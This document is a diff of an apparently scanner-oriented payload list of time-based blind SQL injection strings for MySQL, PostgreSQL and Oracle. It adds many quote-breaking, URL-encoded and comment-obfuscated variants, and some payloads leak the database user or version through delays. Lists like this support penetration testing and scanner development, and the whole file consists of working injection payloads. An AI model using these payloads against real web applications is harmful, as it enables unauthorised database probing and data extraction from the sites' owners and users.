@@ -1,28 +1,64 @@
+XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR
+0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%*1),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'X
 0"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR"Z
+if(now()=sysdate(),sleep(%__TIME_OUT__%),0)
+'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'
+'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%*1),0))OR'
 'XOR(if((select now()=sysdate()),sleep(%__TIME_OUT__%),0))XOR'Z
+R(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))OR"*/
 X'XOR(if(now()=sysdate(),//sleep(%__TIME_OUT__%)//,0))XOR'X
 X'XOR(if(now()=sysdate(),(sleep((((%__TIME_OUT__%))))),0))XOR'X
+(if(now()=sysdate(),sleep(%__TIME_OUT__%),0) and %__TIME_OUT__%=%__TIME_OUT__%)"/
 X'XOR(if((select now()=sysdate()),BENCHMARK(%__TIME_OUT__%,md5('xyz')),0))XOR'X
 'XOR(SELECT(0)FROM(SELECT(SLEEP(%__TIME_OUT__%)))a)XOR'Z
+if(now()=sysdate(),SLEEP(%__TIME_OUT__%),0)
 (SELECT(0)FROM(SELECT(SLEEP(%__TIME_OUT__%)))a)
-'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))OR'
+'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%*5),0))OR'
+'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%*5*0),0))OR'
+SLEEP(%__TIME_OUT__%)/*' or SLEEP(%__TIME_OUT__%) or '" or SLEEP(%__TIME_OUT__%) or "*/
 (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))a)
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)
+(SELECT SLEEP(%__TIME_OUT__%))
+%2c(select%5*%5from%5(select(sleep(%__TIME_OUT__%)))a)
 '%2b(select*from(select(sleep(%__TIME_OUT__%)))a)%2b'
-CASE//WHEN(LENGTH(version())=%__TIME_OUT__%)THEN(SLEEP(6*1))END
+1'%2b(select*from(select(sleep(%__TIME_OUT__%)))a)%2b'
+desc%2c(select*from(select(sleep(%__TIME_OUT__%)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(%__TIME_OUT__%))A))
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(%__TIME_OUT__%))A))
+(select*from(select(sleep(%__TIME_OUT__%)))a)
+,(select * from (select(sleep(%__TIME_OUT__%)))a)
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))YYYY)
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))YYYY)#
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))YYYY)--
+'+(select*from(select(sleep(%__TIME_OUT__%)))a)+'
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)%2f'+
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)+'"
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)%2f*'+
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)+'"+
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)+"*%2f
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)/*'+
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)+'"+
+(select(0)from(select(sleep(%__TIME_OUT__%)))v)+"*/
+',''),/*test*/%26%26%09sLeEp(%__TIME_OUT__%)%09--+
+CASE//WHEN(LENGTH(version())=%__TIME_OUT__%)THEN(SLEEP(%__TIME_OUT__%*1))END
 ');(SELECT 4564 FROM PG_SLEEP(%__TIME_OUT__%))--
-["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE(%__TIME_OUT__%)%23"]
+["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//%__TIME_OUT__%//%23"]
 DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,%__TIME_OUT__%)%20AND%20%27bar%27=%27bar
 AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],%__TIME_OUT__%) AND 'bar'='bar
 1' AND (SELECT 6268 FROM (SELECT(SLEEP(%__TIME_OUT__%)))ghXo) AND 'IKlK'='IKlK
 (select*from(select(sleep(%__TIME_OUT__%)))a)
 *'XOR(if(2=2,sleep(%__TIME_OUT__%),0))OR'
--1' or 1=IF(LENGTH(ASCII((SELECT USER())))&gt;%__TIME_OUT__%, 1, 0)--//
+-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>%__TIME_OUT__%, 1, 0)--//
 '+(select*from(select(if(1=1,sleep(%__TIME_OUT__%),false)))a)+'"
-2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)
-BENCHMARK(%__TIME_OUT__%,MD5(CHAR(116)))
-'%2bbenchmark(%__TIME_OUT__%%2csha1(%__TIME_OUT__%))%2b'
+2021 AND (SELECT 6868 FROM (SELECT(SLEEP(%__TIME_OUT__%)))IiOE)
+BENCHMARK(10000000,MD5(CHAR(%__TIME_OUT__%)))
+'%2bbenchmark(10000000%2csha1(%__TIME_OUT__%))%2b'
 '%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(%__TIME_OUT__%),1)))a)--%20 - true
+if(now()=sysdate(),sleep(%__TIME_OUT__%),0)/"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))OR"/
+if(now()=sysdate(),sleep(%__TIME_OUT__%),0)/*'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))OR'"XO
+if(now()=sysdate(),sleep(%__TIME_OUT__%),0)/'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))OR'"XOR
 if(now()=sysdate(),sleep(%__TIME_OUT__%),0)/'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))OR'"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))OR"/
 if(now()=sysdate(),sleep(%__TIME_OUT__%),0)/'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))OR'"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0) and 1=1)"/
 1 and sleep %__TIME_OUT__%--
